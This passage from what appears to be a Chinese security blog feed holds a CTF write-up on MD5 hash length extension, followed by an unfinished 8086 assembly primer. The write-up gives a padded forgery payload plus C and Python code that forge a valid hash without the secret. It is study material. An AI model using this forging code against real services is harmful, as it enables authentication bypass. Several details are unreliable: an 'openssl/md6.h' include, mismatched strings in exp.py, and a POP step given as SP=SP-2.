class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00okay</span><br></pre></td></tr></table></figure><p>urlencode之后为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00okay</span><br></pre></td></tr></table></figure><p>构造后到okay之前即为第一组，我们已经得到了<code>md5(secert+admin)</code>值，直接利用此<code>md5(secert+admin)</code>值运算第二组即可。</p><p>现在我们在不知道具体 <code>$secret</code> 的情况下，已经得知了<code>md5(secert+admin)</code>的值为571580b26c65f306376d4f64e53cb5c7，以及<code>$sercret</code>的位数。而我们得到的 hash 值正是下一轮摘要经过高地位互换的链变量。<br>C语言代码计算：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;openssl/md6.h&gt;</span><br><span class="line">#include&lt;arpa/inet.h&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main(int argc,const char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">        int i;</span><br><span class="line">        unsigned char buffer[MD5_DIGEST_LENGTH];</span><br><span class="line">        MD5_CTX c;</span><br><span class="line"></span><br><span class="line">        MD5_Init(&amp;c);</span><br><span class="line">        MD5_Update(&amp;c,&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;,64);</span><br><span class="line"></span><br><span class="line">        c.A = htonl(0x571580b2);</span><br><span class="line">        c.B = htonl(0x6c65f306);</span><br><span class="line">        c.C = htonl(0x376d4f64);</span><br><span class="line">        c.D = htonl(0xe53cb5c7);</span><br><span class="line"></span><br><span class="line">        MD5_Update(&amp;c,&quot;okay&quot;,4);</span><br><span class="line">        MD5_Final(buffer,&amp;c);</span><br><span class="line">        for(i=0; i&lt;16; i++)&#123;</span><br><span class="line">                printf(&quot;%02x&quot;,buffer[i]);</span><br><span class="line">        &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这里注意编译的时候带上openssl的ib库，即-l crypto：<br>gcc hash-md5.c -l crypto -pie -fpic -o hash-md5</p><p>python实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A=0xb2801557</span><br><span class="line">B=0x06f3656c</span><br><span class="line">C=0x644f6d37</span><br><span class="line">D=0xc7b53ce5</span><br></pre></td></tr></table></figure><p>my_md5.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author：DshtAnger</span><br><span class="line"># theory reference:</span><br><span class="line">#   blog：</span><br><span class="line">#       http://blog.csdn.net/adidala/article/details/28677393</span><br><span class="line">#       http://blog.csdn.net/forgotaboutgirl/article/details/7258109</span><br><span class="line">#       http://blog.sina.com.cn/s/blog_6fe0eb1901014cpl.html</span><br><span class="line">#   RFC1321：</span><br><span class="line">#       https://www.rfc-editor.org/rfc/pdfrfc/rfc1321.txt.pdf</span><br><span class="line">##############################################################################</span><br><span class="line">import sys</span><br><span class="line">def genMsgLengthDescriptor(msg_bitsLenth):</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    ---args:</span><br><span class="line">            msg_bitsLenth : the bits length of raw message</span><br><span class="line">    --return:</span><br><span class="line">            16 hex-encoded string , i.e.64bits,8bytes which used to describe the bits length of raw message added after padding</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    return __import__(&quot;struct&quot;).pack(&quot;&gt;Q&quot;,msg_bitsLenth).encode(&quot;hex&quot;)</span><br><span class="line"></span><br><span class="line">def reverse_hex_8bytes(hex_str):</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    --args:</span><br><span class="line">            hex_str: a hex-encoded string with length 16 , i.e.8bytes</span><br><span class="line">    --return:</span><br><span class="line">            transform raw message descriptor to little-endian </span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    hex_str = &quot;%016x&quot;%int(hex_str,16)</span><br><span class="line">    assert len(hex_str)==16    </span><br><span class="line">    return __import__(&quot;struct&quot;).pack(&quot;&lt;Q&quot;,int(hex_str,16)).encode(&quot;hex&quot;)</span><br><span class="line"></span><br><span class="line">def reverse_hex_4bytes(hex_str):</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    --args:</span><br><span class="line">            hex_str: a hex-encoded string with length 8 , i.e.4bytes</span><br><span class="line">    --return:</span><br><span class="line">            transform 4 bytes message block to little-endian</span><br><span class="line">    &apos;&apos;&apos;    </span><br><span class="line">    hex_str = &quot;%08x&quot;%int(hex_str,16)</span><br><span class="line">    assert len(hex_str)==8    </span><br><span class="line">    return __import__(&quot;struct&quot;).pack(&quot;&lt;L&quot;,int(hex_str,16)).encode(&quot;hex&quot;)</span><br><span class="line"></span><br><span class="line">def deal_rawInputMsg(input_msg):</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    --args:</span><br><span class="line">            input_msg : inputed a ascii-encoded string</span><br><span class="line">    --return:</span><br><span class="line">            a hex-encoded string which can be inputed to mathematical transformation function.</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    ascii_list = [x.encode(&quot;hex&quot;) for x in input_msg]</span><br><span class="line">    length_msg_bytes = len(ascii_list)</span><br><span class="line">    length_msg_bits = len(ascii_list)*8</span><br><span class="line">    #padding</span><br><span class="line">    ascii_list.append(&apos;80&apos;)  </span><br><span class="line">    while (len(ascii_list)*8+64)%512 != 0:  </span><br><span class="line">        ascii_list.append(&apos;00&apos;)</span><br><span class="line">    #add Descriptor</span><br><span class="line">    ascii_list.append(reverse_hex_8bytes(genMsgLengthDescriptor(length_msg_bits)))</span><br><span class="line">    return &quot;&quot;.join(ascii_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getM16(hex_str,operatingBlockNum):</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    --args:</span><br><span class="line">            hex_str : a hex-encoded string with length in integral multiple of 512bits</span><br><span class="line">            operatingBlockNum : message block number which is being operated , greater than 1</span><br><span class="line">    --return:</span><br><span class="line">            M : result of splited 64bytes into 4*16 message blocks with little-endian</span><br><span class="line"></span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    M = [int(reverse_hex_4bytes(hex_str[i:(i+8)]),16) for i in xrange(128*(operatingBlockNum-1),128*operatingBlockNum,8)]</span><br><span class="line">    return M</span><br><span class="line"></span><br><span class="line">#定义函数，用来产生常数T[i]，常数有可能超过32位，同样需要&amp;0xffffffff操作。注意返回的是十进制的数</span><br><span class="line">def T(i):</span><br><span class="line">    result = (int(4294967296*abs(__import__(&quot;math&quot;).sin(i))))&amp;0xffffffff</span><br><span class="line">    return result   </span><br><span class="line"></span><br><span class="line">#定义每轮中用到的函数</span><br><span class="line">#RL为循环左移，注意左移之后可能会超过32位，所以要和0xffffffff做与运算，确保结果为32位</span><br><span class="line">F = lambda x,y,z:((x&amp;y)|((~x)&amp;z))</span><br><span class="line">G = lambda x,y,z:((x&amp;z)|(y&amp;(~z)))</span><br><span class="line">H = lambda x,y,z:(x^y^z)</span><br><span class="line">I = lambda x,y,z:(y^(x|(~z)))</span><br><span class="line">RL = L = lambda x,n:(((x&lt;&lt;n)|(x&gt;&gt;(32-n)))&amp;(0xffffffff))</span><br><span class="line"></span><br><span class="line">def FF(a, b, c, d, x, s, ac):  </span><br><span class="line">    a = (a+F ((b), (c), (d)) + (x) + (ac)&amp;0xffffffff)&amp;0xffffffff;  </span><br><span class="line">    a = RL ((a), (s))&amp;0xffffffff;  </span><br><span class="line">    a = (a+b)&amp;0xffffffff  </span><br><span class="line">    return a  </span><br><span class="line">def GG(a, b, c, d, x, s, ac):  </span><br><span class="line">    a = (a+G ((b), (c), (d)) + (x) + (ac)&amp;0xffffffff)&amp;0xffffffff;  </span><br><span class="line">    a = RL ((a), (s))&amp;0xffffffff;  </span><br><span class="line">    a = (a+b)&amp;0xffffffff  </span><br><span class="line">    return a  </span><br><span class="line">def HH(a, b, c, d, x, s, ac):  </span><br><span class="line">    a = (a+H ((b), (c), (d)) + (x) + (ac)&amp;0xffffffff)&amp;0xffffffff;  </span><br><span class="line">    a = RL ((a), (s))&amp;0xffffffff;  </span><br><span class="line">    a = (a+b)&amp;0xffffffff  </span><br><span class="line">    return a  </span><br><span class="line">def II(a, b, c, d, x, s, ac):  </span><br><span class="line">    a = (a+I ((b), (c), (d)) + (x) + (ac)&amp;0xffffffff)&amp;0xffffffff;  </span><br><span class="line">    a = RL ((a), (s))&amp;0xffffffff;  </span><br><span class="line">    a = (a+b)&amp;0xffffffff  </span><br><span class="line">    return a      </span><br><span class="line"></span><br><span class="line">def show_md5(A,B,C,D):</span><br><span class="line">    return &quot;&quot;.join( [  &quot;&quot;.join(__import__(&quot;re&quot;).findall(r&quot;..&quot;,&quot;%08x&quot;%i)[::-1]) for i in (A,B,C,D)  ]  )</span><br><span class="line"></span><br><span class="line">def run_md5(A=0x67452301,B=0xefcdab89,C=0x98badcfe,D=0x10325476,readyMsg=&quot;&quot;):</span><br><span class="line"></span><br><span class="line">    a = A</span><br><span class="line">    b = B</span><br><span class="line">    c = C</span><br><span class="line">    d = D</span><br><span class="line"></span><br><span class="line">    for i in xrange(0,len(readyMsg)/128):</span><br><span class="line">        M = getM16(readyMsg,i+1)</span><br><span class="line">        for i in xrange(16):</span><br><span class="line">            exec &quot;M&quot;+str(i)+&quot;=M[&quot;+str(i)+&quot;]&quot;</span><br><span class="line">        #First round</span><br><span class="line">        a=FF(a,b,c,d,M0,7,0xd76aa478L)</span><br><span class="line">        d=FF(d,a,b,c,M1,12,0xe8c7b756L)</span><br><span class="line">        c=FF(c,d,a,b,M2,17,0x242070dbL)</span><br><span class="line">        b=FF(b,c,d,a,M3,22,0xc1bdceeeL)</span><br><span class="line">        a=FF(a,b,c,d,M4,7,0xf57c0fafL)</span><br><span class="line">        d=FF(d,a,b,c,M5,12,0x4787c62aL)</span><br><span class="line">        c=FF(c,d,a,b,M6,17,0xa8304613L)</span><br><span class="line">        b=FF(b,c,d,a,M7,22,0xfd469501L)</span><br><span class="line">        a=FF(a,b,c,d,M8,7,0x698098d8L)</span><br><span class="line">        d=FF(d,a,b,c,M9,12,0x8b44f7afL)</span><br><span class="line">        c=FF(c,d,a,b,M10,17,0xffff5bb1L)</span><br><span class="line">        b=FF(b,c,d,a,M11,22,0x895cd7beL)</span><br><span class="line">        a=FF(a,b,c,d,M12,7,0x6b901122L)</span><br><span class="line">        d=FF(d,a,b,c,M13,12,0xfd987193L)</span><br><span class="line">        c=FF(c,d,a,b,M14,17,0xa679438eL)</span><br><span class="line">        b=FF(b,c,d,a,M15,22,0x49b40821L)</span><br><span class="line">        #Second round</span><br><span class="line">        a=GG(a,b,c,d,M1,5,0xf61e2562L)</span><br><span class="line">        d=GG(d,a,b,c,M6,9,0xc040b340L)</span><br><span class="line">        c=GG(c,d,a,b,M11,14,0x265e5a51L)</span><br><span class="line">        b=GG(b,c,d,a,M0,20,0xe9b6c7aaL)</span><br><span class="line">        a=GG(a,b,c,d,M5,5,0xd62f105dL)</span><br><span class="line">        d=GG(d,a,b,c,M10,9,0x02441453L)</span><br><span class="line">        c=GG(c,d,a,b,M15,14,0xd8a1e681L)</span><br><span class="line">        b=GG(b,c,d,a,M4,20,0xe7d3fbc8L)</span><br><span class="line">        a=GG(a,b,c,d,M9,5,0x21e1cde6L)</span><br><span class="line">        d=GG(d,a,b,c,M14,9,0xc33707d6L)</span><br><span class="line">        c=GG(c,d,a,b,M3,14,0xf4d50d87L)</span><br><span class="line">        b=GG(b,c,d,a,M8,20,0x455a14edL)</span><br><span class="line">        a=GG(a,b,c,d,M13,5,0xa9e3e905L)</span><br><span class="line">        d=GG(d,a,b,c,M2,9,0xfcefa3f8L)</span><br><span class="line">        c=GG(c,d,a,b,M7,14,0x676f02d9L)</span><br><span class="line">        b=GG(b,c,d,a,M12,20,0x8d2a4c8aL)</span><br><span class="line">        #Third round</span><br><span class="line">        a=HH(a,b,c,d,M5,4,0xfffa3942L)</span><br><span class="line">        d=HH(d,a,b,c,M8,11,0x8771f681L)</span><br><span class="line">        c=HH(c,d,a,b,M11,16,0x6d9d6122L)</span><br><span class="line">        b=HH(b,c,d,a,M14,23,0xfde5380c)</span><br><span class="line">        a=HH(a,b,c,d,M1,4,0xa4beea44L)</span><br><span class="line">        d=HH(d,a,b,c,M4,11,0x4bdecfa9L)</span><br><span class="line">        c=HH(c,d,a,b,M7,16,0xf6bb4b60L)</span><br><span class="line">        b=HH(b,c,d,a,M10,23,0xbebfbc70L)</span><br><span class="line">        a=HH(a,b,c,d,M13,4,0x289b7ec6L)</span><br><span class="line">        d=HH(d,a,b,c,M0,11,0xeaa127faL)</span><br><span class="line">        c=HH(c,d,a,b,M3,16,0xd4ef3085L)</span><br><span class="line">        b=HH(b,c,d,a,M6,23,0x04881d05L)</span><br><span class="line">        a=HH(a,b,c,d,M9,4,0xd9d4d039L)</span><br><span class="line">        d=HH(d,a,b,c,M12,11,0xe6db99e5L)</span><br><span class="line">        c=HH(c,d,a,b,M15,16,0x1fa27cf8L)</span><br><span class="line">        b=HH(b,c,d,a,M2,23,0xc4ac5665L)</span><br><span class="line">        #Fourth round</span><br><span class="line">        a=II(a,b,c,d,M0,6,0xf4292244L)</span><br><span class="line">        d=II(d,a,b,c,M7,10,0x432aff97L)</span><br><span class="line">        c=II(c,d,a,b,M14,15,0xab9423a7L)</span><br><span class="line">        b=II(b,c,d,a,M5,21,0xfc93a039L)</span><br><span class="line">        a=II(a,b,c,d,M12,6,0x655b59c3L)</span><br><span class="line">        d=II(d,a,b,c,M3,10,0x8f0ccc92L)</span><br><span class="line">        c=II(c,d,a,b,M10,15,0xffeff47dL)</span><br><span class="line">        b=II(b,c,d,a,M1,21,0x85845dd1L)</span><br><span class="line">        a=II(a,b,c,d,M8,6,0x6fa87e4fL)</span><br><span class="line">        d=II(d,a,b,c,M15,10,0xfe2ce6e0L)</span><br><span class="line">        c=II(c,d,a,b,M6,15,0xa3014314L)</span><br><span class="line">        b=II(b,c,d,a,M13,21,0x4e0811a1L)</span><br><span class="line">        a=II(a,b,c,d,M4,6,0xf7537e82L)</span><br><span class="line">        d=II(d,a,b,c,M11,10,0xbd3af235L)</span><br><span class="line">        c=II(c,d,a,b,M2,15,0x2ad7d2bbL)</span><br><span class="line">        b=II(b,c,d,a,M9,21,0xeb86d391L)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        A += a</span><br><span class="line">        B += b</span><br><span class="line">        C += c</span><br><span class="line">        D += d</span><br><span class="line"></span><br><span class="line">        A = A&amp;0xffffffff</span><br><span class="line">        B = B&amp;0xffffffff</span><br><span class="line">        C = C&amp;0xffffffff</span><br><span class="line">        D = D&amp;0xffffffff</span><br><span class="line"></span><br><span class="line">        a = A</span><br><span class="line">        b = B</span><br><span class="line">        c = C</span><br><span class="line">        d = D</span><br><span class="line"></span><br><span class="line">    return show_md5(a,b,c,d)</span><br></pre></td></tr></table></figure><p>exp.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import my_md5</span><br><span class="line">samplehash=&quot;571580b26c65f306376d4f64e53cb5c7&quot;</span><br><span class="line">#将哈希值分为四段,并反转该四字节为小端序,作为64第二次循环的输入幻书</span><br><span class="line">s1=0xb2801557</span><br><span class="line">s2=0x06f3656c</span><br><span class="line">s3=0x644f6d37</span><br><span class="line">s4=0xc7b53ce5</span><br><span class="line">#exp</span><br><span class="line">secret = &quot;A&quot;*15</span><br><span class="line">secret_admin = secret + &apos;adminadmin&#123;padding&#125;&apos;</span><br><span class="line">padding = &apos;\x80&#123;zero&#125;\xc8\x00\x00\x00\x00\x00\x00\x00&apos;.format(zero=&quot;\x00&quot;*(64-15-10-1-8))</span><br><span class="line">secret_admin = secret_admin.format(padding=padding) + &apos;dawn&apos;</span><br><span class="line">r = my_md5.deal_rawInputMsg(secret_admin)</span><br><span class="line">inp = r[len(r)/2:] #我们需要截断的地方，也是我们需要控制的地方</span><br><span class="line">print &quot;getmein:&quot;+my_md5.run_md5(s1,s2,s3,s4,inp)</span><br></pre></td></tr></table></figure><p><img src="/images/haxikuozhanchangdugongji2.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;MD5算法流程&quot;&gt;&lt;a href=&quot;#MD5算法流程&quot; class=&quot;headerlink&quot; title=&quot;MD5算法流程&quot;&gt;&lt;/a&gt;MD5算法流程&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/haxikuozhanchangdugongji1.png&quot; a
      
    
    </summary>
    
    
      <category term="Web安全" scheme="https://kevens10.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF Web" scheme="https://kevens10.github.io/tags/CTF-Web/"/>
    
      <category term="MD5" scheme="https://kevens10.github.io/tags/MD5/"/>
    
  </entry>
  
  <entry>
    <title>基础汇编</title>
    <link href="https://kevens10.github.io/articles/%E5%9F%BA%E7%A1%80%E6%B1%87%E7%BC%96.html"/>
    <id>https://kevens10.github.io/articles/%E5%9F%BA%E7%A1%80%E6%B1%87%E7%BC%96.html</id>
    <published>2019-11-18T13:25:44.000Z</published>
    <updated>2019-11-18T08:31:18.534Z</updated>
    
    <content type="html"><![CDATA[<p>8086汇编语言指令大致分为以下几类</p><ul><li>一、传送类指令</li><li>二、算数运算类指令</li><li>三、位操作指令</li><li>四、串操作指令</li><li>五、控制转移类指令</li><li>六、处理器控制类指令</li><li>七、汇编指令伪指令</li></ul><h2 id="指令简介"><a href="#指令简介" class="headerlink" title="指令简介"></a>指令简介</h2><h3 id="传送类"><a href="#传送类" class="headerlink" title="传送类"></a>传送类</h3><h4 id="数据传送"><a href="#数据传送" class="headerlink" title="数据传送"></a>数据传送</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV 目的操作数，源操作数</span><br><span class="line">XCHG 目的操作数，源操作数 //把源和目的操作数交换数值</span><br></pre></td></tr></table></figure><h4 id="有效地址传送"><a href="#有效地址传送" class="headerlink" title="有效地址传送"></a>有效地址传送</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LEA 目的操作数，源操作数</span><br><span class="line">把源操作数的偏移地址送目的操作数，</span><br><span class="line">源操作数必须是一个内存操作数，</span><br><span class="line">目的操作数必须是16位通用寄存器</span><br></pre></td></tr></table></figure><h4 id="堆栈指针操作指令"><a href="#堆栈指针操作指令" class="headerlink" title="堆栈指针操作指令"></a>堆栈指针操作指令</h4><p>堆栈是一块特殊的存储器区域，这块区域是以先进后出的方式工作，系统为此提供了特殊的指针SP，和段寄存器SS<br>主要特点是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">（1）堆栈是以字方式操作的</span><br><span class="line">（2）压入堆栈。</span><br><span class="line">①先修改指针：SP=SP -2</span><br><span class="line">②再存入一个字</span><br><span class="line">（3）弹出堆栈。</span><br><span class="line">①先弹出一个字</span><br><span class="line">②再修改指针：SP=SP +2</span><br><span class="line">（4）入栈指令PUSH</span><br><span class="line">格式：PUSH 操作数</span><br><span class="line">该指令为数据入栈指令</span><br><span class="line">即将操作数指定的一个字节的内容传送至SP所指的栈顶</span><br><span class="line">寻址方式有寄存器寻址(段寄存器SS除外)和存储器寻址，</span><br><span class="line">不能用立即数作操作数。</span><br><span class="line">该指令不影响标志位。</span><br><span class="line">过程：</span><br><span class="line">首先，堆栈SP=SP-2</span><br><span class="line">然后，操作数的高位字节——&gt;存入((SP)+1)单元中</span><br><span class="line">操作数的低位字节——&gt;送入(SP)</span><br><span class="line">（5）出栈指令：POP</span><br><span class="line">POP 操作数</span><br><span class="line">将SP所指的栈顶内容传送至操作数指定的一个字。</span><br><span class="line">寻址方式有：</span><br><span class="line">寄存器寻址(段寄存器SS除外)和存储器寻址</span><br><span class="line">不能用立即数作操作数。</span><br><span class="line">该指令不影响标志位。</span><br><span class="line">过程：</span><br><span class="line">首先堆栈((SP)+1)单元字节——&gt;操作数的高字节位，</span><br><span class="line">(SP)单元字节——&gt;操作数的低位字节。</span><br><span class="line">然后SP=SP-2</span><br></pre></td></tr></table></figure><h4 id="输入输出指令"><a href="#输入输出指令" class="headerlink" title="输入输出指令"></a>输入输出指令</h4><p>IN 输入指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IN AL,63H  ; 将端口地址为63H的一个字节内容输入到AL</span><br></pre></td></tr></table></figure><p>OUT 输出指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OUT 66H,AL  ；将AL内容送端口地址66H的单元中</span><br></pre></td></tr></table></figure><h3 id="位操作指令"><a href="#位操作指令" class="headerlink" title="位操作指令"></a>位操作指令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">TEST 测试.(两操作数作与运算,仅修改标志位,不回送结果).</span><br><span class="line">SHL 逻辑左移.</span><br><span class="line">SAL 算术左移.(=SHL)</span><br><span class="line">SHR 逻辑右移.</span><br><span class="line">SAR 算术右移.(=SHR)</span><br><span class="line">ROL 循环左移.</span><br><span class="line">ROR 循环右移.</span><br><span class="line">RCL 通过进位的循环左移.</span><br><span class="line">RCR 通过进位的循环右移.</span><br><span class="line">以上八种移位指令,其移位次数可达255次.</span><br><span class="line">移位一次时, 可直接用操作码. 如 SHL AX,1.</span><br><span class="line">移位&gt;1次时, 则由寄存器CL给出移位次数.</span><br></pre></td></tr></table></figure><h3 id="串操作指令"><a href="#串操作指令" class="headerlink" title="串操作指令"></a>串操作指令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">DS:SI 源串段寄存器 :源串变址.</span><br><span class="line">ES:DI 目标串段寄存器:目标串变址.</span><br><span class="line">CX 重复次数计数器.</span><br><span class="line">AL/AX 扫描值.</span><br><span class="line">D标志 0表示重复操作中SI和DI应自动增量; 1表示应自动减量.</span><br><span class="line">Z标志 用来控制扫描或比较操作的结束.</span><br><span class="line">MOVS 